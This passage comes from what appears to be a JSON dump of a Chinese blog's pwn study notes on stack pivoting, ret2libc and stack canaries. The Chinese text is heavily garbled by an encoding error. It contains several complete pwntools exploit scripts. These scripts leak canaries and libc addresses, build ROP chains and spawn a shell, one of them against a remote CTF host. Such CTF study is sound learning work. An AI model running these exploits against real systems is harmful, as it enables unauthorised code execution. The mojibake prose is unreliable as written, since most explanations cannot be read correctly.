ˆè¿ç§»\nè€Œä¸”æœ‰canaryæ³„éœ²\næ‰€ä»¥æ¥æ”¶bufçš„åœ°å€ä¹‹åï¼Œé€šè¿‡printfçš„è¾“å‡ºæ³„éœ²canary,ç„¶ååœ¨bufä¸Šå¸ƒç½®æ³„éœ²libcçš„å‡½æ•°(è¿”å›åœ°å€å†™main),è®©å‡½æ•°è·³è½¬è¿‡å»æ‰§è¡Œä¹‹åæ³„éœ²ï¼Œä¹‹åç”¨æ³„éœ²libcåŸºåœ°å€å»æ‹¿åˆ°shell\n\nåˆå§‹æ—¶æ“ä½œç³»ç»Ÿä¸ºç¨‹åºåˆ†é…äº†å†…å­˜ï¼Œå…¶ä¸­å°±åŒ…æ‹¬åˆå§‹æ ˆç©ºé—´ï¼ˆbuf),ä¹‹åæ ˆè¿ç§»è·³è½¬åˆ°bufæ®µï¼Œå†æ¬¡è¿›å…¥mainå‡½æ•°ï¼Œç¨‹åºåœ¨è¿™é‡Œå†æ¬¡åˆ›å»ºæ ˆå¸§ï¼Œæ‰€ä»¥è¾“å‡ºçš„bufçš„åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¦é‡æ–°æ¥æ”¶åœ°å€\n\nè„šæœ¬from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./111&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv:    p = remote(remote_host, remote_port)else:    p = process(file_path)    #gdb.attach(p, &quot;b*0x04012D7&quot;)p.recvuntil(b&quot;Before you start to attack, I give you a small gift\\n&quot;)p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())puts_plt=elf.plt[&#x27;puts&#x27;]read_got=elf.got[&#x27;read&#x27;]main=0x40120Aleave=0x4012D7  rdi=0X401205ret=0X40101apayload1 = b&#x27;a&#x27; *0x28+ b&#x27;b&#x27;p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary -------------------:&#123;hex(canary)&#125;&quot;)pay=p64(rdi) + p64(read_got) + p64(puts_plt)+ p64(ret)+p64(main)+ p64(canary)+p64(buf-8)+p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.send(pay)read= u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(f&quot;read: &#123;hex(read)&#125;&quot;)libc = LibcSearcher(&quot;read&quot;, read)libc_base = read - libc.dump(&quot;read&quot;)system= libc_base + libc.dump(&#x27;system&#x27;)bin= libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(b&quot;base=============&quot;+hex(libc_base).encode())# rsi=libc_base+0x2be51# rdx=libc_base+0xa5722p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())p.send(b&#x27;a&#x27;)pay=p64(rdi)+p64(bin)+p64(system)+b&quot;a&quot;*0x10+p64(canary) + p64(buf- 0x8) + p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.sendline(pay)p.interactive()\n\næ”¶è·\nä»£è¡¨æ ˆä¸å¹³è¡¡\nlea_readé™„ä»¶\n\n\nå¯ä»¥çœ‹åˆ°æ²¡æœ‰æ³„éœ²åœ°å€çš„æœºä¼šï¼Œä½†æ˜¯readæœ¬èº«çš„æ¯”è¾ƒç‰¹æ®Š\n\nreadçš„è¯»å…¥åœ°å€æ˜¯å­˜å‚¨çš„æ˜¯bufçš„åœ°å€ï¼Œä½†æ˜¯å®é™…æ˜¯æŒ‰ç…§å…¶ç›¸å¯¹äºrbpçš„åç§»æ¥ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠrbpèµ‹å€¼ä¸ºæˆ‘ä»¬è¦å†™å…¥çš„åœ°å€+bufçš„off,ä¹‹åæŠŠretçš„åœ°å€è¦†ç›–ä¸º lea     rax, [rbp+buf]çš„åœ°å€ï¼Œè®©å‡½æ•°é‡æ–°æ‰§è¡Œreadçš„å‡†å¤‡è¿‡ç¨‹ï¼Œä»¥æ­£å¸¸è°ƒç”¨\n\n\n è¿™é‡Œæˆ‘ä»¬å¯ä»¥è®©å‡½æ•°è·³è½¬åˆ°bssæ®µï¼Œä½†æ˜¯æ³¨æ„bssæ®µå¤´éƒ¨é€šå¸¸ä¼šå­˜æ”¾ä¸€äº›ç¨‹åºåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„å…¨å±€å˜é‡ã€‚ä¸ºäº†é¿å…è¦†ç›–è¿™äº›é‡è¦æ•°æ®ï¼Œé€šå¸¸ä¼šå°†æ ˆè¿ç§»çš„åœ°å€ç¨å¾®å¾€åç§»åŠ¨ä¸€äº›ï¼Œç•™å‡ºè¶³å¤Ÿçš„ç©ºé—´ã€‚\n\n\n.bss æ®µæ˜¯ä¸€ä¸ªæœªåˆå§‹åŒ–çš„æ•°æ®æ®µï¼Œå®ƒçš„å¤§å°é€šå¸¸åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä½†å…¶ä¸­çš„å¤§éƒ¨åˆ†ç©ºé—´å¯èƒ½æ²¡æœ‰è¢«ä»»ä½•å·²çŸ¥çš„å˜é‡å ç”¨ã€‚ IDA æ˜¾ç¤ºäº† .bss æ®µä» 0x404040 å¼€å§‹ï¼Œåˆ° 0x404069 ç»“æŸï¼Œè¿™è¡¨ç¤ºåœ¨è¿™ä¸ªèŒƒå›´å†…ï¼ŒIDA æ‰¾åˆ°äº†å·²çŸ¥çš„ç¬¦å·ï¼ˆå¦‚stdinã€stderrç­‰ï¼‰ã€‚\nç„¶è€Œï¼Œè¿™å¹¶ä¸æ„å‘³ç€ .bss æ®µåªåˆ° 0x404069ã€‚ç¨‹åºçš„ .bss æ®µçš„å®é™…å¤§å°å¯ä»¥åœ¨ ELF æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ä¸­æ‰¾åˆ°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œ.bss æ®µä¼šæ¯” IDA æ˜¾ç¤ºçš„å·²çŸ¥ç¬¦å·èŒƒå›´å¤§å¾—å¤šã€‚\nç®€å•æ¥è¯´ï¼ŒIDA å°±åƒä¸€ä¸ªå›¾ä¹¦é¦†ç›®å½•ï¼Œåªåˆ—å‡ºäº†æœ‰åå­—çš„ä¹¦ï¼ˆç¬¦å·ï¼‰ï¼Œä½†å¹¶ä¸ä¼šæŠŠæ‰€æœ‰ç©ºä¹¦æ¶ï¼ˆæœªä½¿ç”¨çš„åœ°å€ï¼‰éƒ½ä¸€ä¸€åˆ—å‡ºæ¥ã€‚å¯ä»¥åœ¨ä»»ä½•ç©ºä¹¦æ¶ä¸Šæ”¾ç½®ä½ çš„ä¸œè¥¿ï¼Œåªè¦å®ƒå±äºè¿™ä¸ªå›¾ä¹¦é¦†ï¼ˆ.bss æ®µï¼‰å³å¯ã€‚\næ ˆè¿ç§»çš„ç›®æ ‡åœ°å€å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\n\nå¯å†™ï¼š è¯¥å†…å­˜åŒºåŸŸå¿…é¡»æ˜¯å¯å†™çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠä¼ªé€ çš„ROPé“¾å†™å…¥åˆ°è¿™ä¸ªä½ç½®ã€‚bssæ®µå°±æ˜¯å¯å†™çš„ã€‚\n\nä¸è¢«å ç”¨ï¼š è¯¥åŒºåŸŸä¸èƒ½è¢«ç¨‹åºå½“å‰ä½¿ç”¨çš„å…¶ä»–æ•°æ®ï¼ˆå¦‚å…¨å±€å˜é‡ï¼‰å ç”¨ï¼Œå¦åˆ™ä¼šè¦†ç›–æ•°æ®ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚\nä¹‹æ‰€ä»¥é€‰æ‹©bssæ®µï¼Œæ˜¯å› ä¸ºå®ƒåœ¨ç¨‹åºè¿è¡ŒæœŸé—´é€šå¸¸æ˜¯æœªè¢«åˆå§‹åŒ–çš„ï¼Œå› æ­¤å¯ä»¥å®‰å…¨åœ°ç”¨äºå­˜æ”¾æˆ‘ä»¬çš„ROPé“¾ã€‚è€Œä½¿ç”¨0x405000ï¼ˆæˆ–è€…è„šæœ¬ä¸­çš„0x404500ï¼‰ï¼Œå¯èƒ½æ˜¯ä¸ºäº†é¿å…ä¸bssæ®µèµ·å§‹å¤„çš„å…¨å±€å˜é‡å‘ç”Ÿå†²çªï¼Œå› ä¸ºbssæ®µçš„èµ·å§‹éƒ¨åˆ†å¯èƒ½è¢«ç”¨æ¥å­˜å‚¨ä¸€äº›æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€‚\n\n\næ‰€ä»¥æˆ‘ä»¬æ„é€ çš„æ—¶å€™å°½é‡å¼€ä¸€ä¸ªæ–°é¡µï¼Œé€‰æ‹©ä¸€ä¸ªé¡µå¯¹é½çš„åœ°å€ï¼Œæˆ–è€…è‡³å°‘æ˜¯ä¸€ä¸ªè¾ƒå¤§çš„ã€è¿œç¦»å·²çŸ¥æ•°æ®çš„åç§»åœ°å€ã€‚.bss æ®µçš„é¦–åœ°å€é€šå¸¸è¢«ç¨‹åºç”¨æ¥å­˜æ”¾ä¸€äº›é‡è¦çš„å…¨å±€å˜é‡ã€‚\nè„šæœ¬from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./222&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv:    p = remote(remote_host, remote_port)else:    p = process(file_path)    #gdb.attach(p, &quot;b*0x401211&quot;)def sla(a, b):  p.sendlineafter(a, b)def ru(a):  p.recvuntil(a)def sa(a, b):  p.sendafter(a, b)    bss=0x404500main=0x4011DB   rdi=0x401225leave=0x40121Bread=0x401200rbp=0x40115dputs_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]ret=0x40101apay1=b&quot;a&quot;*0x50+p64(bss+0x50)+p64(read)sa(b&quot;Xswlhhh!Use stack hijacking on him!&quot;,pay1)pay=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(rbp)+p64(bss+0x200+0x50)+p64(read)pay=pay.ljust(0x50,b&quot;a&quot;)+p64(bss-8)+p64(leave)p.send(pay)puts = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(b&quot;puts===========&quot;+hex(puts).encode())libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)print(b&quot;libc_base===========&quot;+hex(libc_base).encode())system=libc_base+libc.dump(&quot;system&quot;)bin=libc_base+libc.dump(&quot;str_bin_sh&quot;)print(b&quot;system===========&quot;+hex(system).encode())print(b&quot;bin===========&quot;+hex(bin).encode())payload=p64(ret)+p64(rdi)+p64(bin)+p64(ret)+p64(system)payload=payload.ljust(0x50,b&quot;\\x00&quot;)payload+= p64(bss+0x200)+p64(leave)p.send(payload)p.interactive()\n\næ”¶è·\nè°ƒç”¨systemå‡½æ•°ä¼šå‹æ ˆï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€ä¹Ÿè¦æŠ¬é«˜ï¼Œç¡®ä¿å®ƒæ˜¯åœ¨rw-pæƒé™æ®µ\nåœ¨æ²¡æœ‰æŠ¬é«˜æ ˆåœ°å€çš„æ—¶å€™\n\n\næ­¤æ—¶æƒé™ä¸å¤Ÿ\n","categories":["pwn_study"],"tags":["PWN","æ ˆè¿ç§»"]},{"title":"æ ˆæº¢å‡ºè¿›é˜¶","url":"/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/","content":"æ ˆè¿ç§»change_ebpï¼ˆæ ˆåŠ«æŒDemo1ï¼‰\n\næœ€å¤šå¡«å……12ä¸ªå­—èŠ‚ï¼Œåªèƒ½è¦†ç›–åˆ°ebp\n\nå†™å…¥çš„magicçš„èŒƒå›´åˆ°0x0804A380ï½0x0804A38C\næ‰€ä»¥æ ˆè¿ç§»\nè„šæœ¬from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive()\n\nebp çš„ä½œç”¨åœ¨å‡½æ•°è°ƒç”¨æ—¶ï¼Œebp ç”¨äºï¼š\n\nå®šä½å±€éƒ¨å˜é‡ï¼ˆå¦‚ v1 ä½äº ebp-8ï¼‰ã€‚\nåœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤è°ƒç”¨è€…çš„æ ˆå¸§ï¼ˆé€šè¿‡ leave æŒ‡ä»¤ï¼‰ã€‚\n\nå…¸å‹å‡½æ•°å°¾å£°ï¼ˆleave; retï¼‰ï¼š\nleave  ; ç›¸å½“äº mov esp, ebp; pop ebpret    ; pop eipï¼Œè·³è½¬åˆ°è¿”å›åœ°å€\n\n\nleave ä¼šï¼š\næŠŠ ebp çš„å€¼èµ‹ç»™ espï¼ˆæ ˆæŒ‡é’ˆæŒ‡å‘ ebpï¼‰ã€‚\nç„¶å pop ebpï¼ˆæ¢å¤è°ƒç”¨è€…çš„ ebpï¼‰ã€‚\n\n\nret ä¼š pop eipï¼ˆè·³è½¬åˆ°è¿”å›åœ°å€ï¼‰ã€‚\n\n\n(1) leave æŒ‡ä»¤çš„æ‰§è¡Œ\n\nmov esp, ebpï¼š\nåŸæœ¬ ebp æŒ‡å‘æ ˆå¸§åŸºå€ï¼Œä½†å·²ç»è¢«è¦†ç›–ä¸º magic_addrï¼ˆ0x0804A380ï¼‰ã€‚\næ‰€ä»¥ esp ç°åœ¨æŒ‡å‘ magic_addrï¼ˆå…¨å±€å˜é‡ magic çš„åœ°å€ï¼‰ã€‚\n\n\npop ebpï¼š\nä» espï¼ˆmagic_addrï¼‰å¼¹å‡ºä¸€ä¸ªå€¼åˆ° ebpã€‚\nå¦‚æœ magic åŒºåŸŸæ²¡æœ‰ç‰¹æ®Šæ„é€ ï¼Œè¿™é‡Œå¯èƒ½ä¸é‡è¦ã€‚\n\n\n\n(2) ret æŒ‡ä»¤çš„æ‰§è¡Œ\n\npop eipï¼š\nä» espï¼ˆmagic_addr + 4ï¼‰å¼¹å‡ºä¸€ä¸ªå€¼åˆ° eipï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ã€‚\nå…³é”®ç‚¹ï¼š\nmagic_addr + 4 æ˜¯ magic å˜é‡çš„ç¬¬ 5-8 å­—èŠ‚ã€‚\næ”»å‡»è€…å·²ç»é€šè¿‡ read(0, &amp;magic, 0xCu) å‘ magic å†™å…¥äº† 12 å­—èŠ‚æ•°æ®ã€‚\nå¦‚æœ magic + 4 å¤„å­˜æ”¾çš„æ˜¯ backdoor åœ°å€ï¼Œret å°±ä¼šè·³è½¬åˆ° backdoorï¼\n\n\n\n\n\nret2libc3(æ ˆåŠ«æŒDemo2)\nåœ¨è¿™é‡Œä»‹ç»ä¸€ç§æ–°çš„åŠæ³•ï¼Œä½¿å‡½æ•°å¯ä»¥ä¸è¿”å›mainå‡½æ•°\nè„šæœ¬from pwn import *p = process(&quot;./ret2libc3&quot;)gdb.attach(p,&quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]gets_plt = elf.plt[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]# ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;pop_ebp_ret = 0x080485db# ROPgadget --binary ./ret2libc3 | grep leaveleave_ret = 0x08048448rop_addr = 0x804a800p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)p.sendline(payload1)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = b&quot;A&quot; * 0x108  # å¡«å……ç¼“å†²åŒºpayload2 += p32(system)  # è°ƒç”¨ systempayload2 += p32(0)  # è¿”å›åœ°å€ï¼ˆä¸é‡è¦ï¼Œå› ä¸ºç›´æ¥æ‹¿ shellï¼‰payload2 += p32(binsh)   # system çš„å‚æ•°p.sendline(payload2)p.interactive()\n\nç¬¬ä¸€ä¸ªpaylaodpayload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)\n\nè¾“å‡ºgetsçš„gotè¡¨åœ°å€ï¼Œæ–¹ä¾¿å¯»æ‰¾libcåŸºå€\nç„¶åp32(pop_ebp_ret)å–å‡ºä¸¤ä¸ªåœ°å€ï¼Œä¸€ä¸ªæ”¾è¿›ebp,ä¸€ä¸ªæ”¾å…¥eip(retæŒ‡ä»¤)ï¼Œæ”¾è¿›eipçš„ä¹Ÿå°±æ˜¯p32(gets_plt)ï¼Œæ­£å¥½æ¥ä¸Šä¸‹ä¸€æ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œã€‚\npayload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)\n\nè°ƒç”¨getsçš„pltè¡¨ï¼Œåˆäº§ç”Ÿäº†ä¸€ä¸ªè¾“å…¥æœºä¼š\npayload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)\n\næŠŠrop_addr - 4ä½œä¸ºebpï¼Œæ‰€ä»¥ç¨‹åºä¼šè·³è½¬åˆ°è¿™é‡Œ\nè€Œrop_addr çš„æ•°æ®å¯ä»¥æœ‰payload2å¡«å…¥ï¼Œç²¾å¿ƒæ„é€ å³å¯\nç¬¬äºŒä¸ªpaylaodå¡«å…¥äº†ä¸Šé¢çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿›å…¥systemå‡½æ•°ï¼Œå†æ„é€ systemå‡½æ•°çš„å‚æ•°&#x2F;bin&#x2F;sh\nå°±æ„é€ å¥½äº†åé—¨å‡½æ•°\nx64çš„æƒ…å†µå…¶å®å·®ä¸å¤šï¼Œå°±æ˜¯å…ˆä¼ å…¥å‚æ•°\nfrom pwn import *p = process(&quot;./ret2libc3_x64&quot;)gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]gets_plt = elf.plt[&quot;gets&quot;]rop_addr = 0x601800# ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x0000000000400783pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp.recvuntil(&quot;ret2libc3_x64\\n&quot;)payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;payload1 += p64(rdi) + p64(gets_got)payload1 += p64(puts_plt)payload1 += p64(rdi) + p64(rop_addr)payload1 += p64(gets_plt)payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.sendline(payload2)p.interactive()\n\n\n\n\n\n\n\n\n\nrbp_leave(æ ˆåŠ«æŒDemo3)\nv1å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†å¯è¾“å…¥çš„å­—ç¬¦æ•°å¤ªå°‘\næœ€å¤šè¦†ç›–åˆ°è¿”å›åœ°å€å¤„ï¼Œæ— æ³•ç›´æ¥rop\næ‰€ä»¥è€ƒè™‘ç”¨nameæ¥æ„é€ ï¼Œç„¶åç”¨v1è½¬è¿‡å»\nè„šæœ¬from pwn import *from LibcSearcher import *p = process(&quot;./rbp_leave&quot;)#gdb.attach(p,&quot;b *0x000000000040073F&quot;)elf = ELF(&quot;./rbp_leave&quot;)name_addr = 0x6010A0# ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x4007c3rsi2 = 0x4007c1pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# ROPgadget --binary ./rbp_leave | grep leaveleave_ret = 0x4006f0 # leave ; retret = 0x4006f1read_input = 0x4006C7rop_addr2 = name_addr + 0x800name = p64(ret) *20name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)p.sendafter(b&quot;leave your name\\n&quot;,name.ljust(0x400,b&quot;\\x00&quot;))payload1 = b&quot;a&quot; * 0x100payload1 += p64(name_addr - 8)payload1 += p64(leave_ret)p.sendafter(&quot;try to break it\\n&quot;,payload1)leak_addr = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))libc=LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr - libc.dump(&quot;read&quot;)libc.address = libc_baseprint(hex(libc.address))system = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.send(payload2)p.interactive()\n\nç¬¬ä¸€ä¸ªpayloadname += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])\n\nè°ƒç”¨putså‡½æ•°æ‰“å°readçš„gotè¡¨åœ°å€\nname += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)\n\nè°ƒç”¨readå‡½æ•°ï¼Œreadçš„å‚æ•°æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥å¤šç”¨äº†å‡ ä¸ªå¯„å­˜å™¨ï¼ŒæŠŠä»ç»ˆç«¯è¾“å…¥çš„æ•°æ®æ”¾åœ¨p64(rop_addr2)çš„ä½ç½®ä¸Š\nname += p64(pop_rsp3) + p64(rop_addr2 - 0x18)\n\nå› ä¸ºp64(pop_rsp3)æœ‰ä¸‰ä¸ªpopæŒ‡ä»¤ï¼Œæ‰€ä»¥æœ‰è¦ç©ºå‡ºè¶³å¤Ÿçš„è·ç¦»ï¼Œé˜²æ­¢æŠŠé‡è¦æ•°æ®å¼¹å‡ºäº†\nç¬¬äºŒä¸ªpayloadå¡«è¡¥v1\npayload1 += p64(name_addr - 8)payload1 += p64(leave_ret)\n\np64(name_addr - 8)ï¼šè¦†ç›– RBP\n\nç›®æ ‡ï¼šå°† RBP ä¿®æ”¹ä¸º name_addr - 8ã€‚\nä¸ºä»€ä¹ˆæ˜¯ name_addr - 8ï¼Ÿ\nleave æŒ‡ä»¤ä¼šæ‰§è¡Œ mov rsp, rbpï¼Œå› æ­¤ rsp å°†æŒ‡å‘ name_addr - 8ã€‚\næ¥ä¸‹æ¥çš„ ret ä¼šä» name_addrï¼ˆå³ name çš„èµ·å§‹åœ°å€ï¼‰å¼€å§‹æ‰§è¡Œ ROP é“¾ã€‚\n-8 çš„è°ƒæ•´ï¼šå› ä¸º leave ä¹‹åä¼š pop rbpï¼Œrsp ä¼š +8ï¼Œæœ€ç»ˆæŒ‡å‘ name_addrã€‚\n\n\n\nç¬¬ä¸‰ä¸ªpayloadpayload2 = p64(rdi) + p64(binsh)payload2 += p64(system)\n\nä¸ºç¬¬ä¸€ä¸ªpayloadæä¾›çš„readè¾“å…¥\nç»¼ä¸Šæ‰€è¿°\né€šè¿‡0å’Œ2æ„é€ å®Œæ•´çš„åé—¨å‡½æ•°ï¼Œç„¶åé€šè¿‡1è¿›å…¥æ‰§è¡Œè¿™ä¸ªåé—¨å‡½æ•°\nè„šæœ¬\nå¦‚ä½•é€‰æ‹©åˆé€‚çš„ rop_addr2ï¼Ÿ\næ–¹æ³• 1ï¼šä½¿ç”¨ name çš„æ‰©å±•åŒºåŸŸ\n\nå¦‚æœ name çš„å¤§å°æ˜¯ 0x400ï¼Œå¯ä»¥é€‰æ‹© name_addr + 0x400 ä¹‹åçš„åœ°å€ï¼ˆå¦‚ name_addr + 0x800ï¼‰ã€‚\nä¼˜ç‚¹ï¼šç®€å•ç›´æ¥ï¼Œæ— éœ€é¢å¤–æ³„éœ²åœ°å€ã€‚\nç¼ºç‚¹ï¼šéœ€ç¡®ä¿ name åŒºåŸŸè¶³å¤Ÿå¤§ï¼ˆæˆ–ç¨‹åºå…è®¸è¶Šç•Œå†™å…¥ï¼‰ã€‚\n\næ–¹æ³• 2ï¼šä½¿ç”¨ libc ä¸­çš„å¯å†™æ®µ\n\nlibc ä¸­æœ‰è®¸å¤šå¯å†™åŒºåŸŸï¼ˆå¦‚ __malloc_hookã€__free_hook é™„è¿‘ï¼‰ã€‚\næ­¥éª¤ï¼š\næ³„éœ² libc åŸºå€ï¼ˆå¦‚é€šè¿‡ puts(read_got)ï¼‰ã€‚\nè®¡ç®—ç›®æ ‡åœ°å€ï¼ˆå¦‚ libc_base + 0x3c4b00ï¼‰ã€‚\n\n\nä¼˜ç‚¹ï¼šç¨³å®šï¼Œé€‚åˆå¤§å‹ ROP é“¾ã€‚\nç¼ºç‚¹ï¼šéœ€è¦å…ˆæ³„éœ² libc åœ°å€ã€‚\n\næ–¹æ³• 3ï¼šä½¿ç”¨å †ï¼ˆHeapï¼‰\n\nå¦‚æœç¨‹åºè°ƒç”¨äº† mallocï¼Œå †åœ°å€å¯èƒ½å¯é¢„æµ‹ã€‚\næ­¥éª¤ï¼š\næ³„éœ²å †åœ°å€ï¼ˆå¦‚é€šè¿‡ puts(malloc_got)ï¼‰ã€‚\né€‰æ‹©å †å—ä¸­çš„ç©ºé—²åŒºåŸŸã€‚\n\n\nä¼˜ç‚¹ï¼šç©ºé—´å¤§ï¼Œä¸æ˜“å†²çªã€‚\nç¼ºç‚¹ï¼šéœ€è¦å †æ³„éœ²ã€‚\n\ncanaryä¿æŠ¤Canaryçš„è®¾è®¡æ€æƒ³ç®€å•é«˜æ•ˆï¼Œå°±æ˜¯åœ¨æ ˆæº¢å‡ºå‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨æ’å…¥ä¸€ä¸ªå€¼ï¼Œå½“å‡½æ•°è¿”å›æ—¶æ£€æµ‹Canaryçš„å€¼æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º&#x2F;ç¼“å†²åŒºæº¢å‡ºã€‚\nä¿æŠ¤åŸç†å½“ç¨‹åºå¯ç”¨Canaryç¼–è¯‘å\næ’å…¥Canaryå€¼\nmov raxï¼Œqword ptr fs:[0x28]mov qword ptr[rbp-8]ï¼Œrax\n\næ£€æŸ¥\nmoV rdx,QWORD PTR [rbp-0x8]xOr rdx,QWORD PTR fs:0x28je0x4005d7&lt;main+65&gt;call 0x400460&lt;_stack_chk_fail@plt&gt;\n\nå¦‚æœæ£€æµ‹å‡ºCanaryçš„å€¼è¢«ä¿®æ”¹è¿‡ï¼Œåˆ™ä¼šè¿è¡Œåˆ°__stack_chk_failå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä½äºglibcä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ELFçš„å»¶è¿Ÿç»‘å®šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œstack_chk_failæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œå½“ç¨‹åºæ²¡æœ‰å¼€å¯FULL RELROä¿æŠ¤æ—¶ï¼Œå¯ä»¥è¢«GOTåŠ«æŒæ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥å…ˆåŠ«æŒstack_chk_failå‡½æ•°çš„GOTï¼Œå†è§¦å‘Canaryæ£€æµ‹æŠ¥é”™ï¼Œè¿™æ—¶å°±ä¼šè¿›å…¥åŠ«æŒçš„åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§åˆ©ç”¨æ€è·¯\n\nåœ¨ Linux x86-64 æ¶æ„ä¸‹ï¼ŒCanaryï¼ˆä¹Ÿç§°ä¸º stack_guard æˆ–æ ˆä¿æŠ¤å€¼ï¼‰é€šå¸¸å¹¶ä¸æ˜¯ç›´æ¥å­˜å‚¨åœ¨æ ˆä¸Šï¼ˆé‚£æ ·å®ƒå°±å®¹æ˜“è¢«æº¢å‡ºï¼‰ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªçº¿ç¨‹æœ¬åœ°å­˜å‚¨ (TLS) åŒºåŸŸä¸­ã€‚\nåœ¨ x86-64 Linux ç³»ç»Ÿä¸­ï¼Œfs å¯„å­˜å™¨ï¼ˆæˆ–è€… gs 